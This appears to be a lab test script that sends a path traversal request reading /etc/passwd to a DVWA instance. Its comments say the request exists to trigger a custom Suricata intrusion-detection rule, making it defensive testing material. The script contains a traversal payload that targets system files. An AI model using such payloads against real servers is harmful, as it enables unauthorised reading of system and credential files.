#!/bin/bash

set -euo pipefail

echo "[*] UC03: Path Traversal / File Inclusion (DVWA)"

DVWA_URL="${DVWA_URL:-http://172.30.20.10}"
DVWA_COOKIE="${DVWA_COOKIE:-security=low; PHPSESSID=test}"
CURL_TIMEOUT="${CURL_TIMEOUT:-10}"

# DVWA File Inclusion lab typically uses parameter 'page'.
# This request includes '../' patterns so Suricata custom rule can alert on traversal.
TARGET="${DVWA_URL%/}/vulnerabilities/fi/?page=../../../../etc/passwd"

echo "[*] Target: $TARGET"

curl -sS -m "$CURL_TIMEOUT" -o /dev/null \
  -H "Cookie: $DVWA_COOKIE" \
  "$TARGET"

echo "[+] Sent traversal payload (lab-only)."
